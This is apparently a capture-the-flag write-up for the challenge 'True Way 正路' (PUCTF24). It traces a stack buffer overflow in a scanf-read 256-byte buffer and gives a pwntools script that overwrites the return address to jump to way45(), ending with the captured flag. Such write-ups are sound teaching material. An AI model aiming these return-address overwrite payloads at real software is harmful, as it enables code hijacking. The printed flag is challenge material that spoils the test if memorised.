## True Way 正路

Decompile program<br>
=> find char[256] and scanf() at main<br>
=> buffer overflow<br>
=> check program<br>
=> lot of wayXX function<br>
=> way45() will show flag after checking a bool `obstacle`<br>
=> var on main char[256] + int32 (8byte)<br>
=> buffer overflow rewrite return address to way45()<br>
=> gdb find address of way45<br>
=> record the address after if check<br>
=> create payload

```py
from pwn import *
import struct

server_address = "chal.polyuctf.com"
port = 31338
conn = remote(server_address, port)

offset = b'a' * 256 + b'b' * 8
return_address = struct.pack("<Q", 0x401cae)
payload = offset + return_address
conn.sendline(payload)

conn.interactive()
```

PUCTF24{y0u_5k1pp3d_7h3_0b574cl3_f1nd_7h3_c0rr3c7_w4y_01e79b412e58108b7738c1b5369d7b04}
